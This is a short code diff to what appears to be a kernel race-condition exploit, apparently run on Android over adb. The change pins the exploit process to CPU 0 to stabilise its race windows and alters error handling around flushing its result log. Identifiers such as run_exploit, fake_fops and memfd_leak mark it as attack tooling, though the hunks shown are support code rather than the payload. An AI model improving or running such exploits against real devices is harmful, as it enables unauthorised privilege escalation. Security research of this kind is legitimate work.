@@ -18,6 +18,18 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+/* Pin this process to CPU 0 for more stable races. */
+static void pin_self_to_cpu0(void) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  CPU_SET(0, &mask);
+  if (sched_setaffinity(0, sizeof(mask), &mask) != 0) {
+    pr_warning("sched_setaffinity CPU0 failed errno=%d\n", errno);
+  } else {
+    pr_success("exploit pinned to CPU 0 pid=%d\n", getpid());
+  }
+}
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -409,6 +421,9 @@ int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
 
+  /* Pin to CPU 0 before any race windows. */
+  pin_self_to_cpu0();
+
   disable_rseq_for_thread();
   set_limit();
   log_startup_context();
@@ -549,13 +564,9 @@ int run_exploit(int argc, char **argv) {
               fake_fops, postwrite_result, probe_restored, triggered);
 #if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
     APP_FOPS_DURABLE_POSTWRITE_LOG
-      /* Preserve the authoritative result even if RDB dies before
-       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
-       * returns EINVAL: that is not a failure worth aborting for. */
-      fflush(NULL);
-      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
-        pr_warning("fsync stdout errno=%d\n", errno);
-      }
+      /* Preserve the authoritative result even if RDB dies before dlopen returns. */
+      SYSCHK(fflush(NULL));
+      SYSCHK(fsync(STDOUT_FILENO));
 #endif
       fops_data_alias_deferred = 0;
     }
